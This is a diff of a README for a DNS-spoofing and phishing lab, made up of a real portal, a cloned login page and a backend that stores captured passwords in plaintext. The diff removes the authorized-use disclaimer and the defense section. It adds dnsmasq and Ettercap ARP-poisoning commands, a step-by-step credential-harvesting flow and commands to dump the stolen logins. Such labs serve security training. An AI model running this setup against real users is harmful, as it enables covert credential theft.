@@ -1,319 +1,128 @@
-# DNS Spoofing & Phishing Lab
+# Phishing Demo Stack for DNS Spoofing Labs
 
-## ⚠️ Educational Purpose Only
+Four web services that act as the targets of a phishing demo in a DNS spoofing exercise:
+a real portal and its auth API, plus a phishing clone that captures credentials and
+redirects back to the real portal. DNS spoofing itself is external. Configure it with
+Ettercap or dnsmasq (see "Spoofing setup (external)" below).
 
-This lab demonstrates DNS spoofing + phishing attacks for **authorized security training only**. See [ETHICAL_DISCLAIMER](./ETHICAL_DISCLAIMER.md) for full legal terms.
+## How to use it
 
----
+1. Start the four services (Quick start below).
+2. Map the target domain to the attacker IP with dnsmasq or Ettercap and point the
+   victim's DNS there (Spoofing setup below).
+3. Browse to the domain on the victim VM. The attack flow below plays out and captured
+   credentials land in `backend-malicious/captured_credentials.json`.
 
-## Quick Start
+## Components
 
-### Prerequisites
+| Component | Port | Purpose | Stack |
+|-----------|------|---------|-------|
+| frontend-legitimate | 5173 | Real portal: login, success/error pages, dashboard | React 18, Axios, Vite 5 |
+| frontend-malicious | 5174 | Phishing clone: captures credentials, instantly redirects | React 18, raw `fetch()`, Vite 6 |
+| backend-legitimate | 3000 | Real auth API: BCrypt validation, audit logging | ASP.NET Core 8, EF Core, SQLite |
+| backend-malicious | 5000 | Capture API: stores plaintext credentials as JSON | ASP.NET Core 8, minimal |
 
-- **Frontend components**: Node.js 18+, npm
-- **Backend components**: .NET 8 SDK
-- **Lab network**: Linux VM with Ettercap, dnsmasq, or similar DNS spoofing tools
+## Attack flow
 
-### 1. Configure Network IPs
+```
+1. Victim resolves TARGET_DOMAIN: external tool (dnsmasq/Ettercap) returns ATTACKER_SERVER_IP
+2. Victim's browser loads the phishing clone while the URL bar shows the correct domain
+3. Victim submits the login form: credentials + device fingerprint POST to the capture API
+4. Capture API appends to captured_credentials.json, returns 200 OK silently
+5. Victim is redirected to the real server by IP (escapes the poisoned DNS)
+6. Victim logs in on the real portal: real authentication succeeds
+7. Done: credentials stolen, nothing looks wrong to the victim
+```
 
-Before starting, identify your lab network IPs and update component configurations:
+## Quick start
 
-| Role | IP Address | Example |
-|------|---|---|
-| Real server (legitimate) | `LEGITIMATE_SERVER_IP` | `192.168.1.100` |
-| Attacker machine (your lab PC) | `ATTACKER_SERVER_IP` | `192.168.1.150` |
-| Victim VM | `VICTIM_IP` | `192.168.1.50` |
-| Target domain | `TARGET_DOMAIN` | `example.lab` |
+Prerequisites: Node 18+, .NET 8 SDK, and a lab network (victim VM, attacker machine).
 
-### 2. Start Components (Open 4 Terminal Tabs)
-
-**Terminal 1 — Frontend - Legitimate Portal**
 ```bash
-cd frontend-legitimate
-npm install
-cp .env.example .env      # Copy template to actual config
-nano .env                 # Configure API endpoint
-npm run dev              # Runs on http://localhost:5173
+# Terminal 1: legit portal
+cd frontend-legitimate && npm install && npm run dev        # :5173
+
+# Terminal 2: phishing clone
+cd frontend-malicious && npm install && npm run dev         # :5174
+
+# Terminal 3: legit auth API (review appsettings.json first)
+cd backend-legitimate && dotnet run                         # :3000
+
+# Terminal 4: capture API (review appsettings.json first)
+cd backend-malicious && dotnet run                          # :5000
 ```
 
-**Terminal 2 — Frontend - Malicious Clone**
+Demo users on the real backend:
+
+| Email | Password | Role |
+|-------|----------|------|
+| admin@enterprise.local | Admin@123456 | Admin |
+| user@enterprise.local | User@123456 | Employee |
+| demo@enterprise.local | Demo@123456 | Employee |
+
+## Configuration
+
+None of the IPs, ports, or redirect targets live in source code. Edit config, then
+restart: Vite inlines `.env` values at dev-server start / build time (production builds
+bake them in), ASP.NET reads `appsettings.json` at startup.
+
+| File | Keys to review |
+|------|----------------|
+| frontend-legitimate/.env | `VITE_APP_TITLE`, `VITE_API_BASE_PATH` (backend URL), `VITE_FALLBACK_IP` |
+| frontend-malicious/.env | `VITE_BACKEND_HOST`, `VITE_BACKEND_PORT` (capture API), `VITE_LEGITIMATE_SERVER_IP` (redirect target) |
+| backend-legitimate/appsettings.json | `Server:Port`, `ConnectionStrings`, `Cors:AllowedOrigins` |
+| backend-malicious/appsettings.json | `Server:Port`, `CredentialCapture:LogsDirectory`, `CredentialCapture:CredentialsFilename` |
+
+Configuration pitfalls:
+
+1. `VITE_LEGITIMATE_SERVER_IP` must be an IP (or IP:port), **not the domain**: navigating
+   by IP bypasses the poisoned DNS entry and reaches the real server.
+2. `Cors:AllowedOrigins` must list every origin the legit portal is served from. A CORS
+   mismatch is the #1 "frontend can't connect" cause. The capture API allows all origins
+   (hardcoded AllowAll in its Program.cs, by design).
+
+## Spoofing setup (external)
+
+Point the victim's DNS at the attacker machine, then map the target domain to it:
+
 ```bash
-cd frontend-malicious
-npm install
-cp .env.example .env      # Copy template to actual config
-nano .env                 # Configure malicious backend + redirect target
-npm run dev              # Runs on http://localhost:5174
+# dnsmasq on the attacker machine: zone example.lab to attacker IP, forward the rest
+dnsmasq --no-hosts --no-resolv --server=8.8.8.8 --address=/example.lab/192.168.1.150
+
+# or Ettercap with a /etc/etter.dns entry:  example.lab  A  192.168.1.150
+ettercap -T -M arp:remote /192.168.1.50// /192.168.1.1//
 ```
 
-**Terminal 3 — Backend - Legitimate (Real Auth Server)**
+Verify on the victim VM: `nslookup example.lab` must return the attacker IP. Then browse
+to `http://example.lab` on the victim and the attack flow above plays out.
+
+## Captured data
+
+Stored at `backend-malicious/captured_credentials.json` and served unauthenticated via
+`GET /api/auth/logs`. Fields: email, password (plaintext), source IP, user agent,
+timezone, screen resolution, language, platform, timestamp.
+
 ```bash
-cd backend-legitimate
-dotnet restore
-nano appsettings.json     # Review & customize port, CORS, database path
-dotnet run              # Runs on http://localhost:3000
+cat backend-malicious/captured_credentials.json | jq '.[] | {email, password, timezone}'
+curl http://localhost:5000/api/auth/logs | jq '.credentials[] | {email, password}'
 ```
 
-**Terminal 4 — Backend - Malicious (Credential Capture)**
-```bash
-cd backend-malicious
-dotnet restore
-nano appsettings.json     # Review & customize port, CORS, database path
-dotnet run              # Runs on http://localhost:5000
-```
-
----
-
-## Project Structure
-
-```
-dns-spoofing-lab/
-├── README.md 
-├── .gitignore  
-│
-├── frontend-legitimate/            ← Real enterprise portal
-│   ├── src/
-│   ├── .env                        ← Dev config (ignored by git)
-│   └── .env.example                ← Template
-│
-├── frontend-malicious/             ← Phishing clone
-│   ├── src/
-│   ├── .env                        ← Dev config (ignored by git)
-│   └── .env.example                ← Template
-│
-├── backend-legitimate/             ← Real auth service
-│   ├── Controllers/
-│   ├── Services/
-│   └── appsettings.json
-│
-└── backend-malicious/              ← Credential capture
-    ├── Controllers/
-    ├── Services/
-    └── appsettings.json
-```
-
----
-
-## Attack Flow
-
-```
-Step 1: Victim connects to TARGET_DOMAIN (e.g., example.lab)
-        ↓
-Step 2: Ettercap DNS spoofing intercepts and redirects to ATTACKER_SERVER_IP
-        ↓
-Step 3: Victim browser loads phishing frontend (malicious on 5174)
-        ↓ (visually identical to legitimate site)
-Step 4: Victim enters credentials on login form
-        ↓
-Step 5: Malicious backend captures:
-        • Username & password
-        • Device fingerprint (userAgent, timezone, screen, language)
-        ↓
-Step 6: Victim redirected to legitimate server (real site on 5173)
-        ↓
-Step 7: Victim enters password on real site (succeeds)
-        ↓
-Step 8: Attack complete — credentials stolen, victim unaware
-```
-
----
-
-## The Four Components
-
-| Component | Port | Purpose |
-|-----------|------|---------|
-| **Frontend Legitimate** | 5173 | Real enterprise portal |
-| **Frontend Malicious** | 5174 | Phishing clone (DNS spoofing target) |
-| **Backend Legitimate** | 3000 | Real authentication API |
-| **Backend Malicious** | 5000 | Credential capture service |
-
-### Why This Attack Works
-
-1. **Visual Cloning** — Malicious frontend is pixel-perfect identical
-2. **DNS Spoofing** — Victim sees correct domain in URL bar (`example.lab`)
-3. **Transparent Redirect** — User redirected back to real server (no suspicion)
-4. **Silent Capture** — Credentials logged server-side before redirect
-5. **No Error Messages** — Process completes normally (user success = attacker success)
-6. **Device Fingerprinting** — Extra data captured for targeting/profiling
-
----
-
-## Configuration Files
-
-📂 **For detailed setup instructions, see each component's README:**
-- [frontend-legitimate/README.md](frontend-legitimate/README.md)
-- [frontend-malicious/README.md](frontend-malicious/README.md)
-- [backend-legitimate/README.md](backend-legitimate/README.md)
-- [backend-malicious/README.md](backend-malicious/README.md)
-
-### Frontend - Legitimate
-
-**`.env.example` (template)**
-```bash
-VITE_APP_TITLE=Enterprise Portal
-VITE_APP_TAGLINE=Secure Access Hub
-VITE_EMAIL_PLACEHOLDER=Enter your email
-VITE_API_BASE_PATH=http://localhost:3000/api
-VITE_API_TIMEOUT=5000
-```
-
-### Frontend - Malicious
-
-**`.env.example` (template)**
-```bash
-# Malicious backend location (captures credentials)
-VITE_BACKEND_HOST=localhost
-VITE_BACKEND_PORT=5000
-
-# Legitimate server location (for redirect after capture)
-VITE_LEGITIMATE_SERVER_IP=localhost:5173
-```
-
-**⚠️ Important:** The malicious frontend needs BOTH:
-1. The malicious backend (to capture credentials)
-2. The legitimate server URL (to redirect victim)
-
-### Backend Components (.NET/C#)
-
-**`appsettings.json`**
-```json
-{
-  "Server": {
-    "Port": 5000,
-    "Protocol": "http"
-  },
-  "Cors": {
-    "AllowedOrigins": [
-      "http://localhost:5173",
-      "http://localhost:5174"
-    ]
-  },
-  "Database": {
-    "Provider": "sqlite",
-    "Path": "app.db"
-  }
-}
-```
-
----
-
-## Key Differences: Frontend
+## Legit vs malicious
 
 | Aspect | Legitimate | Malicious |
-|--------|---|---|
-| **Backend Contact** | port 3000 (legit auth) | port 5000 (credential capture) |
-| **Redirect Logic** | Only on success after delay | Immediately, always |
-| **Service Layer** | Axios with abstraction | Raw fetch() API |
-| **Error Handling** | Graceful, informative | None, always redirects |
-| **Device Fingerprinting** | None | Comprehensive metadata |
-| **User Feedback** | Clear messages | Silent theft |
-| **Validation** | Comprehensive | None |
+|--------|------------|-----------|
+| Login endpoint | Real BCrypt validation, full error handling | No validation, always 200, then instant redirect |
+| Feedback | Success/error pages with clear messages | None: even fetch errors redirect |
+| Data kept | BCrypt hash in SQLite, audit trail per attempt | Plaintext credentials in a JSON file |
+| CORS | Restricted to configured origins | AllowAll |
 
----
+Other real-API endpoints: `POST /api/auth/logout`, `GET /api/dashboard/resource/{id}`
+(placeholder), `GET /api/dashboard/activity`. The phishing clone sends a device
+fingerprint (user agent, timezone, screen, language, platform) along every capture.
 
-## Key Differences: Backend
+## References
 
-| Aspect | Legitimate | Malicious |
-|--------|-----------|-----------|
-| **Purpose** | Authenticate users | Capture credentials |
-| **Storage** | SQLite database | JSON file |
-| **Passwords** | BCrypt hashed | Plaintext |
-| **Validation** | Comprehensive | None |
-| **Authentication** | Yes | No |
-
----
-
-## Learning Outcomes
-
-This lab teaches:
-
-1. **DNS Spoofing Mechanics** — How attackers redirect traffic at the DNS level
-2. **Phishing Effectiveness** — Visual appearance alone is insufficient defense
-3. **Credential Harvesting** — Silent capture with device fingerprinting
-4. **Attack Chain Complexity** — DNS + phishing + API integration working together
-5. **Defense Mechanisms** — Why MFA, DNSSEC, and cert pinning work
-
----
-
-## Defense Mechanisms
-
-| Defense | Effectiveness | How It Helps |
-|---------|---|---|
-| **DNSSEC** | ⭐⭐⭐⭐⭐ | Cryptographically validates DNS responses |
-| **Multi-Factor Authentication (MFA)** | ⭐⭐⭐⭐⭐ | Stolen password alone is insufficient |
-| **Hardware Security Keys** | ⭐⭐⭐⭐⭐ | Cannot be phished (requires hardware) |
-| **DNS over HTTPS (DoH)** | ⭐⭐⭐⭐ | Encrypts DNS queries end-to-end |
-| **Certificate Pinning** | ⭐⭐⭐⭐ | Detects fraudulent HTTPS certificates |
-| **Email Authentication** (SPF/DKIM/DMARC) | ⭐⭐⭐ | Prevents phishing emails from spoofed domains |
-
----
-
-## Troubleshooting
-
-### Ports Already in Use
-
-**Frontend (Vite):** Edit `vite.config.js`
-```javascript
-server: {
-  port: 5175,
-  host: '0.0.0.0'
-}
-```
-
-**Backend (.NET):** Edit `appsettings.json`
-```json
-{
-  "Server": {
-    "Port": 5001
-  }
-}
-```
-
-Update CORS as well:
-```json
-"Cors": {
-  "AllowedOrigins": ["http://localhost:5175"]
-}
-```
-
-### DNS Spoofing Not Working
-
-- Verify Ettercap/dnsmasq is running
-- Check `NETWORK_INTERFACE` matches your NIC (eth0, wlan0, etc.)
-- Ensure victim's DNS points to attacker machine
-- Check firewall rules allow DNS (port 53/UDP)
-- Use `nslookup example.lab` on victim to verify DNS resolution
-
-### Frontend Can't Connect to Backend
-
-- Verify backend is running (`dotnet run`)
-- Check frontend's `.env` has correct backend host/port
-- Verify CORS settings in `appsettings.json` include frontend origins
-- Check firewall allows traffic on backend ports (3000, 5000)
-- Use browser DevTools (Network tab) to see actual requests/errors
-
----
-
-## Full Lab Test (With DNS Spoofing)
-
-1. Set up victim VM
-2. Configure attacker machine with Ettercap/dnsmasq
-3. Add DNS spoofing rule: `example.lab` → attacker IP
-4. Victim attempts to visit `http://example.lab`
-5. Victim sees phishing frontend
-6. Victim credentials captured in `captured_credentials.json`
-7. Victim redirected to real server
-
----
-
-## Resources
-
-- [OWASP Phishing](https://owasp.org/www-community/attacks/phishing)
-- [DNS Spoofing - Wikipedia](https://en.wikipedia.org/wiki/DNS_spoofing)
-- [Ettercap Documentation](https://www.ettercap-project.org/)
-- [DNSSEC Overview - ICANN](https://www.icann.org/dnssec/)
-
----
-
-## License & Disclaimer
-
-**This lab is for authorized security training only.** Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide. See [ETHICAL_DISCLAIMER](./ETHICAL_DISCLAIMER.md) for full legal terms.
+- OWASP phishing: https://owasp.org/www-community/attacks/phishing
+- OWASP credential harvesting: https://owasp.org/www-community/attacks/Credential_harvesting
+- Ettercap: https://www.ettercap-project.org/
+- DNSSEC overview: https://www.icann.org/dnssec/
